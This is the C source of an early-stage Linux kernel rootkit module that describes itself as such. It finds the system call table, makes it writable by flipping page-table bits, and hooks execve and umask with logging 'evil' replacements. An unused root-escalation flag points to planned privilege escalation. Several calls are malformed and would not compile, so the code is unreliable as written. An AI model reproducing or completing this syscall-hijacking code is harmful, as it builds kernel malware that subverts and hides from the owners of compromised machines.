#include <asm/unistd.h>
#include <asm/cacheflush.h>
#include <asm/pgtable_types.h>
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/fs.h>
#include <linux/sched.h>
#include <linux/kallsyms.h>
#include <linux/cred.h>

#define LAZARUS_MODULE_LICENSE "GPL"
#define LAZARUS_MODULE_AUTHOR "Claudio Migliorelli <migliorelliclaudio@gmail.com>"
#define LAZARUS_MODULE_DESCRIPTION "A LKM Linux rootkit"
#define LAZARUS_MODULE_VERSION "0.1"

/* set root escalation flag */
int ref = 0;

/* system call table address */
void **sct_addr;

/* function pointer to default umask syscall */
asmlinkage int (*def_umask) (mode_t mask);

/* function pointer to default execve syscall */
asmlinkage int (*def_execve) (const char *filename, const char *const argv[], const char *const envp[]);

asmlinkage int evil_umask(mode_t mask)
{
  printk("[+] LZRS - program flow hijacked - umask()");

  /* call the origin syscall */
  return def_umask(mode_t mask);
}

asmlinkage int evil_execve(const char *filename, const char *const argv[], const char *const envp[])
{
  printk("[+] LZRS - program flow hijacked - execve()");

  /* call the origin syscall */
  return def_execve(const char *filename, const char *const argv[], const char *const envp[]);
}

/* make SCT writeable */
int set_sct_rw(unsigned long sct_addr)
{
  unsigned int level;
  pte_t *pte = lookup_address(sct_addr, &level);
  if (pte->pte &~_PAGE_RW) {
    pte->pte |=_PAGE_RW;
  }
  return 0;
}

int set_sct_ro(unsigned long sct_addr)
{
  unsigned int level;
  pte_t *pte = lookup_address(sct_addr, &level);
  pte->pte = pte->pte &~_PAGE_RW;
  return 0;
}

void sys_call_table_retrieve(void)
{
  /* looking for the system call table address in exported symbols */
  sct_addr = (void *)kallsyms_lookup_name("sys_call_table");
}

/* load the LKM */
static int __init lzrs_t_load(void)
{
  /* retrieve the system call table address */
  sys_call_table_retrieve();

  /* set pointers to origin syscalls */
  def_execve = sct_addr[__NR_execve];
  def_umask = sct_addr[__NR_umask];

  /* set the system call table writeable */
  set_sct_rw(sct_addr);

  /* hook execve and umask syscalls */
  sct_addr[__NR_execve] = evil_execve;
  sct_addr[__NR_umask] = evil_umask;

  /* set the system call table write protected */
  set_sct_ro(sct_addr);

  printk("[+] LZRS - syscall_table: 0x%llx - execve_syscall: 0x%llx - umask_syscall: 0x%llx", sct_addr, sct_addr[__NR_execve], sct_addr[__NR_umask]);

  return 0;
}

/* unload the LKM */
static void __exit lzrs_t_unload(void)
{
  /* set the system call table writeable */
  set_sct_rw(sct_addr);

  /* rewrite the original syscall addresses */
  sct_addr[__NR_execve] = def_execve;
  sct_addr[__NR_umask] = def_umask;

  /* set the system call table write protected */
  set_sct_ro(sct_addr);

}

module_init(lzrs_t_load);
module_exit(lzrs_t_unload);

MODULE_LICENSE(LAZARUS_MODULE_LICENSE);
MODULE_AUTHOR(LAZARUS_MODULE_AUTHOR);
MODULE_DESCRIPTION(LAZARUS_MODULE_DESCRIPTION);
MODULE_VERSION(LAZARUS_MODULE_VERSION);
